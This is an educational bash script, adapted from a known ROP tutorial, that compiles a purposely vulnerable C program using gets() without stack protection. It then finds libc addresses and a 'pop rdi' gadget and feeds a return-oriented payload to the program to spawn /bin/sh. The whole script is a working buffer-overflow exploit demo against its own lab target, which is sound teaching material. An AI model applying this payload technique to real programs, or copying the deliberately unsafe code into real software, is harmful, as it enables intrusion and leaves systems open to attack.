#!/bin/bash
# initial credit to : Ben Lynn 2012
# http://crypto.stanford.edu/~blynn/rop/ 
# initial rop.sh file :  http://crypto.stanford.edu/~blynn/rop/rop.sh
# also ideas inspired from : https://github.com/finallyjustice/security/blob/master/rop/demo1/README.txt

# Modified and adapted by B.E. tirzaz@protonmail.com 2017






# Demonstrates a buffer overflow exploit that uses return-oriented programming.
# Unlike the other script, executable space protection remains enabled throughout the attack.


# Works on Ubuntu 12.04 on x86_64.
# Works on Linux 3.2.0-53-generic #81-Ubuntu 2013 x86_64 x86_64 x86_64 GNU/Linux
# Works on Linux 3.13.0-32-generic #57-Ubuntu 2014 x86_64 x86_64 x86_64 GNU/Linux
# Works on Linux 2.6.34-gentoo-r12 #1 2010 x86_64 Intel(R) Core(TM)2  GNU/Linux;;

# to launch the demo, place the file where you want, and launch it as a normal sh batch, wait seconds, and now you have a shell on your hand. Type "ls" for example to see the files of the current dir.



###############################   Script ################################################## 

# Setup temp dir.

origdir=`pwd`
tmpdir=`mktemp -d`
cd $tmpdir
echo temp dir: $tmpdir

# Find the addresses we need for the exploit.

echo finding libc base address...
cat > findbase.c << "EOF"
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main() {
  char cmd[64];
  sprintf(cmd, "pmap %d", getpid());
  system(cmd);
  return 0;
}
EOF
gcc -o findbase findbase.c
base=0x$(setarch `arch` -R ./findbase | grep -m1 libc | cut -f1 -d' ')
echo ...base of libc at : $base

# Find the libc shared library file
thisdir=`pwd`
libc=/lib/`cd /lib; find -name "*libc.so*" | grep -m1 libc;cd $thisdir`
echo libc found at : $libc

# Find the "system" function offset in the libc
system=0x$(nm -D $libc | grep '\<system\>' | cut -f1 -d' ')
echo ...system func offset at : $system

# Find the "exit" function offset in the libc
exit=0x$(nm -D $libc | grep '\<exit\>' | cut -f1 -d' ')
echo ...exit func offset at : $exit

# Find the "pop rdi, ret" gadget
gadget=0x$(xxd -c1 -p $libc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}')
echo ...push-RDI gadget at $gadget

# Here's the victim program. It conveniently prints the buffer address.

echo compiling victim...
cat > victim.c << "EOF"
#include <stdio.h>
int main() {
  char name[64];
  printf("%p\n", name);  // Print address of buffer.
  puts("What's your name?");
  gets(name);
  printf("Hello, %s!\n", name);
  return 0;
}
EOF
cat victim.c
gcc -g -w -fno-stack-protector -o victim victim.c
addr=$(echo | setarch $(arch) -R ./victim | sed 1q) # the command "setarch $(arch) -R ./victim" will launch ./victim without ASLR activated.
echo ...name[64] starts at $addr



#this is the offset of the string "/bin/sh" in our payload
offset=0x68



# Attack! We can launch a shell with a buffer overflow despite executable
# space protection.
# Hit Enter a few times, then enter commands.

echo exploiting victim...

(((printf %0144d 0; printf %016x $((base+gadget)) | tac -rs..; printf %016x $((addr+offset)) | tac -rs..; printf %016x $((base+system)) | tac -rs.. ; printf %016x $((base+exit)) | tac -rs.. ; echo  /bin/sh | xxd -p) | xxd -r -p) ; cat) | setarch `arch` -R ./victim



# Clean up work.

echo removing temp dir...
cd $origdir
rm -r $tmpdir
